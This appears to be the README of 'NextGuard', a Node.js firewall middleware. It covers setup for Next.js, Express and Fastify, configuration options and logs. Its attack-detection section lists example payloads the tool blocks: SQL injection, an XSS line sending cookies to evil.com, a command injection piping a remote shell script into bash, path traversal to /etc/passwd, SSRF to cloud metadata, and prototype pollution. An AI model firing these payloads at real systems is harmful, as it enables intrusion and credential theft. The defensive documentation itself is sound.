# NextGuard 🛡️

**Enterprise-grade web application firewall middleware for Node.js.**
Zero configuration required — just plug it in and every attack is blocked automatically.

```ts
// This single line activates full protection on every route
export { nextguard as middleware } from 'nextguard'
```

That's it. All 13 attack detectors, 7-layer defense, rate limiting, auto-ban, and security headers are active with no configuration needed.

---

## Table of Contents

- [How It Works](#how-it-works)
- [Installation](#installation)
- [Quick Start](#quick-start)
  - [Next.js](#nextjs-middleware)
  - [Express.js](#expressjs)
  - [Fastify](#fastify)
- [What Gets Protected Automatically](#what-gets-protected-automatically)
- [The 7-Layer Defense System](#the-7-layer-defense-system)
- [Smart Path Intelligence](#smart-path-intelligence)
- [Attack Detection Coverage](#attack-detection-coverage)
- [Advanced Configuration](#advanced-configuration)
  - [Per-Path Rules](#per-path-rules)
  - [Force Termination](#force-termination)
  - [Heavy Defense (Anti-DDoS)](#heavy-defense-anti-ddos)
  - [Auto-Ban System](#auto-ban-system)
  - [Rate Limiting](#rate-limiting)
  - [Custom Blocked Response](#custom-blocked-response)
  - [Security Headers](#security-headers)
  - [Logging](#logging)
  - [Dry Run Mode](#dry-run-mode)
- [Whitelisting Paths](#whitelisting-paths)
- [Management API](#management-api)
- [Understanding the Logs](#understanding-the-logs)
- [Troubleshooting](#troubleshooting)
- [Changelog](#changelog)

---

## How It Works

NextGuard runs as middleware — it intercepts every HTTP request **before** it reaches your route handlers. If an attack is detected, the request is blocked immediately and never reaches your application code.

```
Incoming Request
      │
      ▼
┌─────────────────────────────────────────┐
│  NextGuard Middleware                   │
│                                         │
│  Layer 1: IP Reputation & Blacklist     │
│  Layer 2: Connection & Rate Control     │
│  Layer 3: Protocol & Header Validation  │
│  Layer 4: Request Integrity Check       │
│  Layer 5: Attack Payload Detection      │  ← SQLi, XSS, RCE, SSRF, etc.
│  Layer 6: Behavioral Analysis           │  ← Bot detection, BOLA, anomaly
│  Layer 7: App Rules + Security Headers  │
└─────────────────────────────────────────┘
      │
      ▼  (only safe requests reach here)
Your Route Handler
```

**Why does my homemade firewall always return 200?**
The most common reason is that the check runs *after* the route handler, or the detection logic doesn't normalize encoded payloads (e.g., `%27` → `'`). NextGuard runs at the middleware layer and always normalizes encoding before scanning.

---

## Installation

```bash
npm install nextguard
# or
yarn add nextguard
# or
pnpm add nextguard
```

---

## Quick Start

### Next.js Middleware

Create `middleware.ts` in the **project root** (same level as `app/` or `pages/`):

```ts
// middleware.ts
export { nextguard as middleware } from 'nextguard'

export const config = {
  matcher: ['/((?!_next/static|_next/image|favicon.ico).*)'],
}
```

**That is the entire file.** Full protection is active. No other configuration is needed.

If you want the matcher to cover everything:

```ts
// middleware.ts
export { nextguard as middleware } from 'nextguard'

export const config = {
  matcher: ['/:path*'],
}
```

> ⚠️ **File location matters.** The file must be named `middleware.ts` (or `middleware.js`) and must sit at the project root — not inside `app/`, `src/`, or `pages/`. If it's in the wrong place, Next.js won't execute it and requests will pass through unprotected.

---

### Express.js

Add NextGuard **before** your route definitions in your entry file (`server.ts`, `app.ts`, or `index.ts`):

```ts
// server.ts
import express from 'express'
import { nextguard } from 'nextguard'

const app = express()

app.use(express.json())
app.use(express.urlencoded({ extended: true }))

// ✅ Add NextGuard here — before any routes
app.use(nextguard())

// Your routes go after
app.get('/api/users', (req, res) => {
  res.json({ users: [] })
})

app.listen(3000, () => console.log('Server running on port 3000'))
```

> ⚠️ **Order matters.** `app.use(nextguard())` must come before your route definitions. If it comes after, requests reach your handlers before being checked.

---

### Fastify

```ts
// server.ts
import Fastify from 'fastify'
import { nextguardPlugin } from 'nextguard'

const fastify = Fastify()

// ✅ Register before routes
await fastify.register(nextguardPlugin)

// Your routes go after
fastify.get('/api/data', async () => {
  return { data: [] }
})

await fastify.listen({ port: 3000 })
```

---

## What Gets Protected Automatically

When you use `nextguard()` with zero configuration, all of this activates automatically:

| Protection | Details | Auto Default |
|---|---|---|
| SQL Injection | Boolean, UNION, stacked, time-based, comment injection | ✅ Always on |
| XSS | Script tags, event handlers, `javascript:` URIs | ✅ Always on |
| Remote Code Execution | Command injection, template injection | ✅ Always on |
| Path Traversal | `../` traversal including encoded variants | ✅ Always on |
| SSRF | Internal IP ranges, cloud metadata, unsafe protocols | ✅ Always on |
| XXE | DOCTYPE declarations, external entity refs, blind XXE | ✅ Always on |
| CRLF Injection | Header splitting, `%0d%0a` variants | ✅ Always on |
| Request Smuggling | CL.TE, TE.CL, CL.CL patterns | ✅ Always on |
| Prototype Pollution | `__proto__`, `constructor.prototype` in JSON | ✅ Always on |
| Open Redirect | External domain redirect via `redirect`, `next`, etc. | ✅ Always on |
| Bot/Scanner Detection | sqlmap, nikto, nmap, ZAP, Burp Suite, etc. | ✅ Always on |
| HTTP Method Override Abuse | `X-HTTP-Method-Override` misuse | ✅ Always on |
| BOLA / IDOR | Sequential ID enumeration (logs warning, no block) | ✅ Always on |
| Rate Limiting | Smart defaults based on path type | ✅ Auto |
| Auto-Ban | 5 violations → 1 hour ban | ✅ Auto |
| Heavy Defense | Burst + concurrent limits | ✅ Auto |
| Security Headers | CSP, HSTS, X-Frame-Options, etc. | ✅ Auto |
| 7-Layer Defense | Full pipeline on every request | ✅ Auto |

---

## The 7-Layer Defense System

Every request passes through all 7 layers in order. If any layer blocks the request, it never reaches the next layer.

**Layer 1 — IP Reputation & Network**
Blocks known bad IPs, Tor exit nodes, datacenter ranges commonly used for attacks, and any IPs you add to a blacklist. This runs first — cheapest check, widest coverage.

**Layer 2 — Connection & Rate Control**
Enforces per-IP concurrent connection limits, per-second burst limits, and detects Slowloris attacks (connections that send HTTP requests extremely slowly to hold server resources). Connections that exceed the timeout (default: 30s) are terminated.

**Layer 3 — Protocol & Header Validation**
Validates that the request follows proper HTTP. Checks header size limits (8KB per header, 16KB total), URI length (8192 chars max), valid HTTP methods, and Host header integrity. Returns `431` for oversized headers.

**Layer 4 — Request Integrity**
Checks body size limits (10MB default), Content-Type consistency, and detects HTTP Request Smuggling via conflicting `Transfer-Encoding` / `Content-Length` headers. Returns `413` for oversized payloads and `400` for smuggling attempts.

**Layer 5 — Payload & Injection Detection**
Runs all 13 attack detectors against the fully normalized (decoded) request. This is where SQLi, XSS, RCE, SSRF, XXE, Path Traversal, CRLF, Prototype Pollution, Open Redirect, and Method Override are caught. Returns `403`.

**Layer 6 — Behavioral Analysis**
Analyzes patterns across multiple requests from the same IP. Detects bot scanners by User-Agent, sequential ID enumeration (BOLA/IDOR), and anomalous endpoint access patterns (e.g., scanning 50+ different endpoints in 60 seconds). Adds offending IPs to a temporary blocklist for 5 minutes.

**Layer 7 — Application Context & Response**
Handles custom per-path rules you define, injects security headers into every outgoing response, and runs any custom validator functions you provide.

The log for each request includes `layerTrace` showing which layer caught the attack:
```json
{"layerTrace": [{"layer":1,"result":"pass"}, {"layer":5,"result":"block"}]}
```

---

## Smart Path Intelligence

Without any configuration, NextGuard automatically assigns protection intensity based on the URL path:

| Path Pattern | Protection Level | Auto Rate Limit |
|---|---|---|
| `/admin/**`, `/auth/**`, `/login`, `/signup`, `/register` | **Maximum** — all detectors + force terminate on attack | 10 req/min |
| `/api/**` | **Standard** — all detectors | 100 req/min |
| Everything else | **Baseline** — all detectors | 500 req/min |

You don't set this. NextGuard reads the path and applies the appropriate level automatically.

---

## Attack Detection Coverage

### SQL Injection
Detects all major SQLi techniques after decoding encoded payloads.

```
# These are all blocked:
GET /users?id=1' OR '1'='1
GET /users?id=1 UNION SELECT username,password FROM users--
GET /users?id=1; DROP TABLE users; --
GET /users?id=1' AND SLEEP(5)--
POST /login  {"user": "admin'--", "pass": "anything"}
```

### XSS (Cross-Site Scripting)
Detects script injection including HTML-entity-encoded and URL-encoded variants.

```
# These are all blocked:
GET /page?q=<script>alert(document.cookie)</script>
GET /page?q=<img src=x onerror=fetch('https://evil.com/'+document.cookie)>
GET /page?q=javascript:alert(1)
GET /page?q=%3Cscript%3Ealert(1)%3C/script%3E   ← encoded, still caught
GET /page?q=&lt;script&gt;alert(1)&lt;/script&gt;  ← HTML entities, still caught
```

### Remote Code Execution
Detects command injection and template injection.

```
# These are all blocked:
GET /ping?host=127.0.0.1; cat /etc/passwd
GET /ping?host=127.0.0.1 | whoami
GET /ping?host=$(curl https://evil.com/shell.sh | bash)
POST /template  {"body": "{{7*7}}"}
POST /template  {"body": "${__import__('os').system('id')}"}
```

### Path Traversal
Detects directory traversal including encoded and normalized variants.

```
# These are all blocked:
GET /files?path=../../etc/passwd
GET /files?path=%2e%2e%2f%2e%2e%2fetc%2fpasswd
GET /api/v1/../../etc/shadow        ← resolved path traversal still caught
GET /files?path=C:\Windows\System32\drivers\etc\hosts
```

### SSRF
Detects attempts to make the server fetch internal resources.

```
# These are all blocked:
GET /fetch?url=http://169.254.169.254/latest/meta-data/   ← AWS metadata
GET /fetch?url=http://127.0.0.1:6379                      ← internal Redis
GET /proxy?target=file:///etc/passwd
GET /proxy?target=gopher://127.0.0.1:25/
```

### Prototype Pollution
Detects attempts to corrupt the JavaScript prototype chain via JSON payloads.

```json
// These request bodies are all blocked:
{"__proto__": {"admin": true}}
{"constructor": {"prototype": {"isAdmin": true}}}
```

```
// URL-encoded form also blocked:
POST /data  __proto__[admin]=true
```

---

## Advanced Configuration

Everything below is **optional**. The library works without any of this. Use these options only when you need to override the automatic defaults.

### Per-Path Rules

```ts
import { nextguard } from 'nextguard'

export default nextguard({
  rules: [
    // Whitelist — skip all checks for this path
    { path: '/public/**', action: 'allow' },
    { path: '/health', action: 'allow' },
    { path: '/_next/**', action: 'allow' },

    // Stricter rate limit on login
    {
      path: '/api/auth/login',
      rateLimit: { maxRequests: 5, windowMs: 60_000 },
    },

    // Disable specific detectors for a path that needs them off
    {
      path: '/api/search',
      detectors: {
        sqli: false,   // search might contain SQL-like syntax legitimately
        xss: true,
        rce: true,
        pathTraversal: true,
        ssrf: true,
      },
    },
  ],
})
```

**Supported path patterns:**

| Pattern | Example | Matches |
|---|---|---|
| Exact | `/api/login` | Only `/api/login` |
| Single wildcard | `/api/*/data` | `/api/users/data`, `/api/orders/data` |
| Recursive wildcard | `/api/**` | `/api/users`, `/api/v1/users/123/profile` |

Rules are evaluated in order. The first matching rule wins.

---

### Force Termination

Force termination drops the TCP connection without sending any HTTP response. Use it on your most sensitive endpoints.

```ts
export default nextguard({
  rules: [
    {
      path: '/api/admin/**',
      forceTerminate: true,  // connection is destroyed immediately on attack
    },
  ],
})
```

**How it behaves by runtime:**
- **Node.js (Express/Fastify):** Calls `socket.destroy()` — the connection drops at TCP level. The attacker gets a connection reset, not a 403.
- **Next.js Edge Runtime:** Returns HTTP `444 No Response` (Nginx-style "silent drop") because Edge Runtime doesn't expose raw socket access.

---

### Heavy Defense (Anti-DDoS)

Auto-activates by default. Override the defaults only if needed:

```ts
export default nextguard({
  heavyDefense: {
    // Max simultaneous connections from one IP (default: 50)
    concurrentLimit: 30,

    // Max requests per second from one IP (default: 20)
    // Exceeding this triggers progressive delays: 100ms → 500ms → 1000ms
    burstLimit: 10,

    // If total active connections exceed this, Emergency Shield activates
    // Only whitelisted IPs are served. All others get 503. (default: 10000)
    globalConcurrentLimit: 5000,

    // Block these IPs/CIDRs before any other processing (Layer 1)
    ipReputation: [
      '192.0.2.0/24',
      '198.51.100.5',
    ],
  },
})
```

**Emergency Shield** activates automatically when:
- Total connections exceed `globalConcurrentLimit`, OR
- A sudden 50x traffic spike is detected compared to baseline

When active, only IPs in your whitelist are served. All others get `503 Service Unavailable`.

---

### Auto-Ban System

Auto-activates by default (5 violations → 1 hour ban). Override if needed:

```ts
export default nextguard({
  autoBan: {
    threshold: 3,        // ban after 3 violations in 10 minutes (default: 5)
    banDuration: 7200,   // ban for 2 hours in seconds (default: 3600)
    maxBans: 50_000,     // max IPs held in memory (default: 10000)
  },
})
```

A "violation" is any confirmed attack detection. After `threshold` violations within a 10-minute window, the IP is banned. Banned IPs receive `403` instantly on every subsequent request — no detectors run, no processing overhead.

---

### Rate Limiting

Auto-activates with path-based smart defaults. NextGuard also automatically detects request spikes — if traffic from a single IP exceeds 10x the normal baseline for a path within 10 seconds, progressive throttling kicks in without any configuration needed (100ms delay → 500ms → 1000ms).

Override limits per path if needed:

```ts
export default nextguard({
  rules: [
    {
      path: '/api/auth/login',
      rateLimit: {
        maxRequests: 5,     // 5 requests...
        windowMs: 60_000,   // ...per 60 seconds per IP
      },
    },
    {
      path: '/api/**',
      rateLimit: {
        maxRequests: 200,
        windowMs: 60_000,
      },
    },
  ],
})
```

Every response includes rate limit headers:
```
X-RateLimit-Limit: 100
X-RateLimit-Remaining: 87
X-RateLimit-Reset: 1700000060    ← Unix timestamp when the window resets
```

When the limit is exceeded:
```
HTTP 429 Too Many Requests
Retry-After: 42                  ← seconds until the window resets
```

---

### Custom Blocked Response

By default, blocked requests receive:
```json
HTTP 403 Forbidden
{"error": "Forbidden", "reason": "sql_injection"}
```

Override with your own response format:

```ts
export default nextguard({
  onBlocked: (context, result) => {
    return new Response(
      JSON.stringify({
        success: false,
        code: 'SECURITY_VIOLATION',
        type: result.attackType,
        requestId: crypto.randomUUID(),
      }),
      {
        status: 403,
        headers: { 'Content-Type': 'application/json' },
      }
    )
  },
})
```

The `context` object contains: `url`, `method`, `clientIp`, `headers`, `query`, `body`.
The `result` object contains: `attackType`, `detectedIn`, `matchedPattern`, `confidence`, `layer`.

---

### Security Headers

Injected automatically into every response. Override specific values if needed:

```ts
export default nextguard({
  securityHeaders: {
    // Override the default CSP
    contentSecurityPolicy: "default-src 'self'; img-src 'self' data: https:; script-src 'self'",

    // Change frame options
    xFrameOptions: 'SAMEORIGIN',  // default: 'DENY'

    // Disable a header entirely
    xXssProtection: false,
  },
})
```

**Headers injected by default:**
```
X-Content-Type-Options: nosniff
X-Frame-Options: DENY
X-XSS-Protection: 1; mode=block
Strict-Transport-Security: max-age=31536000; includeSubDomains
Content-Security-Policy: default-src 'self'
```

---

### Logging

```ts
export default nextguard({
  logging: 'info',  // 'silent' | 'error' | 'info'
})
```

| Level | Output |
|---|---|
| `silent` | Nothing — no output at all |
| `error` | Only blocked requests |
| `info` | Everything (default) |

Custom logger:

```ts
export default nextguard({
  customLogger: (event) => {
    // Send to your logging infrastructure
    myLogger.info(event)
  },
})
```

---

### Dry Run Mode

Test NextGuard without actually blocking anything. Attacks are detected and logged but requests pass through normally.

```ts
export default nextguard({
  dryRun: true,
})
```

Every detection log in dry run mode includes `"dryRun": true` so you can filter them.

**Recommended workflow when first deploying:**
1. Start with `dryRun: true`
2. Watch the logs for detections
3. Check if any legitimate requests are being flagged (false positives)
4. Whitelist paths that are getting false positives
5. Switch to `dryRun: false` (or remove it) for production

---

## Whitelisting Paths

If a legitimate path is being blocked, whitelist it:

```ts
export default nextguard({
  rules: [
    // Skip all checks for these paths
    { path: '/public/**', action: 'allow' },
    { path: '/health', action: 'allow' },
    { path: '/api/graphql', action: 'allow' },  // if your schema uses SQL-like syntax

    // Or disable only specific detectors for a path
    {
      path: '/api/search',
      detectors: {
        sqli: false,   // search queries might contain SQL keywords legitimately
        xss: true,
        rce: true,
        pathTraversal: true,
      },
    },
  ],
})
```

---

## Management API

```ts
import { nextguard } from 'nextguard'

const firewall = nextguard()

// Get all currently banned IPs
const banned = firewall.getBannedIPs()
// Returns: [{ ip: '1.2.3.4', expiresAt: 1700000060, reason: 'sqli' }, ...]

// Unban an IP manually (returns true if the IP was found and removed)
const removed = firewall.unbanIP('1.2.3.4')

// Get firewall stats
const stats = firewall.getStats()
// Returns: { totalBlocked, activeBans, activeConnections, uptime }
```

---

## Understanding the Logs

NextGuard logs one JSON object per line. Here are the most common log events:

**Attack blocked:**
```json
{
  "timestamp": "2026-10-07T10:00:00.000Z",
  "event": "attack_blocked",
  "clientIp": "1.2.3.4",
  "method": "GET",
  "url": "/api/users?id=1'--",
  "attackType": "sqli",
  "detectedIn": "query",
  "matchedPattern": "'--",
  "layer": 5,
  "layerTrace": [
    {"layer": 1, "result": "pass"},
    {"layer": 2, "result": "pass"},
    {"layer": 3, "result": "pass"},
    {"layer": 4, "result": "pass"},
    {"layer": 5, "result": "block"}
  ]
}
```

**Rate limit hit:**
```json
{
  "timestamp": "2026-10-07T10:00:05.000Z",
  "event": "rate_limited",
  "clientIp": "1.2.3.4",
  "url": "/api/auth/login",
  "requestCount": 11,
  "windowMs": 60000
}
```

**IP auto-banned:**
```json
{
  "timestamp": "2026-10-07T10:01:00.000Z",
  "event": "ip_banned",
  "clientIp": "1.2.3.4",
  "violations": 5,
  "banDuration": 3600,
  "reason": "sqli"
}
```

**Force terminated:**
```json
{
  "timestamp": "2026-10-07T10:02:00.000Z",
  "event": "force_terminated",
  "clientIp": "1.2.3.4",
  "attackType": "rce",
  "action": "force_terminated"
}
```

**Auto-tuning event:**
```json
{
  "timestamp": "2026-10-07T10:05:00.000Z",
  "event": "auto_tune",
  "path": "/api/search",
  "previousSensitivity": "standard",
  "newSensitivity": "high",
  "reason": "traffic_spike_12x"
}
```

**Startup confirmation:**
```json
{
  "event": "nextguard_started",
  "mode": "auto",
  "layers": 7,
  "detectorsActive": 13,
  "timestamp": "2026-10-07T10:00:00.000Z"
}
```

---

## Troubleshooting

### Attacks are not detected — requests return 200

**Most common cause: NextGuard is not in the middleware layer.**

**Next.js checklist:**
- [ ] File is named exactly `middleware.ts` or `middleware.js`
- [ ] File is in the project root (same level as `package.json` and `app/`)
- [ ] The `matcher` pattern in `export const config` covers the paths you're testing
- [ ] You haven't accidentally put the file inside `app/`, `src/`, or `pages/`

Correct file structure:
```
my-app/
├── app/
│   └── page.tsx
├── middleware.ts   ← must be here
└── package.json
```

**Express.js checklist:**
- [ ] `app.use(nextguard())` appears before any `app.get()` / `app.post()` / `app.use('/route', ...)` calls
- [ ] `app.use(express.json())` appears before `app.use(nextguard())` so the body is readable
- [ ] The test request actually hits the Express server (not a cached response)

**Fastify checklist:**
- [ ] `await fastify.register(nextguardPlugin)` is called before route registrations
- [ ] `await` is used — if you forget it, the plugin might not be registered yet when routes are added

---

### A legitimate request is being blocked

1. Enable dry run temporarily: `nextguard({ dryRun: true })`
2. Reproduce the blocked request
3. Check the log for `matchedPattern` — this shows exactly what triggered the detection
4. If the match is a false positive, whitelist the path or disable the specific detector:

```ts
// Option 1: Whitelist the whole path
{ path: '/api/search', action: 'allow' }

// Option 2: Disable only the triggering detector
{
  path: '/api/search',
  detectors: { sqli: false }  // everything else stays on
}
```

5. Disable dry run when your config is correct.

---

### A legitimate IP was auto-banned

```ts
firewall.unbanIP('the.ip.address.here')
```

To prevent it from being banned again, add it to the IP whitelist:

```ts
export default nextguard({
  ipWhitelist: ['203.0.113.5', '198.51.100.0/24'],
})
```

---

### High memory usage

The auto-ban list holds up to 10,000 entries by default. If you're seeing high memory, reduce it:

```ts
export default nextguard({
  autoBan: { maxBans: 1000 },
})
```

---

### ConfigurationError on startup

This means a config value is invalid. The error message includes the field name and why it was rejected. Common causes:

- `maxRequests` must be a positive integer between 1 and 10,000
- `windowMs` must be between 1,000 and 3,600,000 (1 second to 1 hour)
- `banDuration` must be a positive integer
- `path` patterns must start with `/`

---

## Changelog

### v1.1.0
- Rate Limiter now automatically detects request spikes (>10x baseline in 10 seconds) and applies progressive throttling without any configuration

### v1.0.0
- Initial release
- Zero-config auto-protection with Smart Defaults
- 7-Layer Defense System (all layers auto-active)
- 13 attack detectors (all auto-active)
- Path Intelligence — automatic protection tiers by endpoint type
- Smart Auto-Tuning — sensitivity adjusts automatically based on traffic
- Rate Limiting with path-based smart defaults
- Auto-Ban System (auto-active, 5 violations → 1 hour ban)
- Heavy Defense with Emergency Shield (auto-active)
- Force Termination for high-severity attacks
- Security headers injected automatically on every response
- Full TypeScript support with exported types
- Adapters for Next.js, Express.js, and Fastify
